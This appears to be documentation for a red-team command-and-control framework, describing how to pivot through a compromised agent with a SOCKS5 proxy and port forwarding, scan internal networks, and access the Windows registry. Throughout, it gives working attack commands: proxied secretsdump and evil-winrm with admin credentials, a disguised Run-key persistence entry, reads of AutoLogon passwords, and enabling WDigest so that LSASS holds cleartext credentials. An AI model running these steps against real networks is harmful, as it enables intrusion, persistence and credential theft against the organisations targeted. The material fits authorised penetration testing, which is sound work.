# Network Pivot

Route operator traffic through an agent to reach hosts on internal networks, and scan networks from the agent's perspective.

---

## Why Pivot?

In most engagements, the operator machine (your laptop or VPS) has no direct access to the internal corporate network. The agent, however, does. Pivoting routes your tools' traffic through the agent so you can:
- Use Impacket, Nmap, Metasploit, or any tool against internal hosts
- Access internal web applications in your browser
- Authenticate to internal services with captured credentials

---

## SOCKS5 Proxy

Start an in-process SOCKS5 proxy inside the agent. All TCP connections to the proxy are relayed through the agent to internal hosts.

### Start the Proxy

```
❯ socks5 start a1b2 --addr 127.0.0.1:1080
[*] Starting SOCKS5 proxy on agent a1b2c3d4...
[+] SOCKS5 proxy started.
    Listen on operator: 127.0.0.1:1080
    Relay via agent on: 10.0.0.100 (WORKSTATION-07)
```

### Check Status

```
❯ socks5 status a1b2
[+] SOCKS5 proxy: running
    Address: 127.0.0.1:1080
    Connections: 3 active
```

### Stop the Proxy

```
❯ socks5 stop a1b2
[+] SOCKS5 proxy stopped.
```

---

## Using the SOCKS5 Proxy

Configure your tools to use `127.0.0.1:1080` as the SOCKS5 proxy.

### proxychains (Linux)

```bash
# /etc/proxychains4.conf (or ~/.proxychains/proxychains.conf)
[ProxyList]
socks5 127.0.0.1 1080

# Use any tool through the proxy
proxychains nmap -sT -p 445,3389,5985 10.0.0.0/24
proxychains impacket-secretsdump corp/administrator:password@10.0.0.10
proxychains evil-winrm -i 10.0.0.10 -u administrator -p password
```

### curl / wget

```bash
curl --socks5 127.0.0.1:1080 http://10.0.0.10:8080/admin
```

### Browser (FoxyProxy / SwitchyOmega)

Configure browser proxy extension to route `*.corp.local` traffic through `SOCKS5 127.0.0.1:1080`. You can now browse internal web applications directly.

### Python (impacket tools)

Most impacket tools accept a `--proxy` parameter or can be proxied via `proxychains`.

### Nmap

```bash
proxychains nmap -sT -p 22,80,443,445,1433,3389,5985 10.0.0.0/24 --open
```

---

## Port Forwarding

Forward a specific local port on the operator machine to a specific host:port on the internal network, using the agent as a relay.

```
# Forward operator's local 3389 → 10.0.0.10:3389 (RDP)
❯ portfwd start a1b2 --local 3389 --remote 10.0.0.10:3389
[+] Port forward active: 127.0.0.1:3389 → 10.0.0.10:3389 via agent a1b2c3d4

# Connect with RDP client to localhost
rdesktop 127.0.0.1:3389
# or
mstsc /v:127.0.0.1

# Forward local 5432 → internal postgres server
❯ portfwd start a1b2 --local 5432 --remote 10.0.0.20:5432
psql -h 127.0.0.1 -p 5432 -U postgres
```

### List Active Forwards

```
❯ portfwd list
Session         Local           Remote          Via Agent
-------------------------------------------------------------
sess-001        0.0.0.0:3389   10.0.0.10:3389  a1b2c3d4...
sess-002        0.0.0.0:5432   10.0.0.20:5432  a1b2c3d4...
```

### Remove a Forward

```
❯ portfwd stop sess-001
[+] Port forward sess-001 removed.
```

---

## Network Scan from the Agent

The agent can scan internal networks directly without needing the operator to proxy through it. Results return via the beacon channel.

```
# TCP port scan across the 10.0.0.0/24 subnet
❯ netscan a1b2 -t 10.0.0.0/24 -p 22,80,443,445,1433,3389,5985 --wait

# Scan with banner grabbing to identify services
❯ netscan a1b2 -t 10.0.0.10 --banners --wait
```

**Output:**
```
[+] TCP Scan Results (from 10.0.0.100):

10.0.0.1   :80    open
10.0.0.1   :443   open
10.0.0.10  :445   open  [SMB2/3 - Windows Server 2019 Build 17763]
10.0.0.10  :3389  open  [RDP - Microsoft RDP (Windows Server 2019)]
10.0.0.10  :5985  open  [WinRM - Microsoft HTTPAPI/2.0]
10.0.0.11  :22    open  [SSH - OpenSSH 8.2p1 Ubuntu]
10.0.0.20  :445   open  [SMB2/3 - Windows 10 Build 19041]
10.0.0.20  :3389  open  [RDP]
```

---

## ARP Scan (Local Subnet)

Discover every host on the agent's local subnet using ARP — more complete than TCP scan because firewalled hosts still respond to ARP.

```
❯ arpscan a1b2 --wait
[+] ARP Scan Results (from 10.0.0.100, subnet /24):

10.0.0.1    00:50:56:e0:11:22   VMware default gateway
10.0.0.10   00:0c:29:aa:bb:cc   [unresolved]
10.0.0.11   00:0c:29:dd:ee:ff   [unresolved]
10.0.0.15   00:1a:2b:3c:4d:5e   Cisco Systems
10.0.0.20   00:0c:29:11:22:33   [unresolved]
10.0.0.50   00:50:56:e0:99:aa   VMware
```

**Combine with netscan:**
1. `arpscan` to get all live hosts
2. `netscan` on specific IPs from the ARP results to identify services
3. Pivot to target machines via SOCKS5 or port forward

---

## Registry Access

Read, write, enumerate, and delete Windows registry keys on the agent machine.

```
# Read a registry value
❯ registry read a1b2 HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion -V CurrentBuild
[+] CurrentBuild = 19041

# List all values under a key
❯ registry list a1b2 HKCU\Software\Microsoft\Windows\CurrentVersion\Run
[+] Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    OneDrive = C:\Users\jsmith\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background
    Teams    = C:\Users\jsmith\AppData\Roaming\Microsoft\Teams\Update.exe --processStart Teams.exe

# Write a value (persistence example)
❯ registry write a1b2 HKCU\Software\Microsoft\Windows\CurrentVersion\Run \
    -V WindowsSecurityUpdate \
    -d "C:\Users\jsmith\AppData\Local\svc.exe"
[+] Value written.

# Delete a value
❯ registry delete a1b2 HKCU\Software\Microsoft\Windows\CurrentVersion\Run -V WindowsSecurityUpdate
[+] Value deleted.
```

**High-value reads:**
```
# AutoLogon credentials
❯ registry read a1b2 "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -V DefaultPassword

# Check if WDigest is enabled (cleartext creds in LSASS)
❯ registry read a1b2 "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -V UseLogonCredential

# Find PowerShell execution policy
❯ registry read a1b2 "HKLM\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell" -V ExecutionPolicy
```

**Enable WDigest for future LSASS dumps (requires admin + reboot/re-logon):**
```
❯ registry write a1b2 "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" \
    -V UseLogonCredential -d 1
```

After the next user logon, LSASS will cache cleartext credentials in memory.
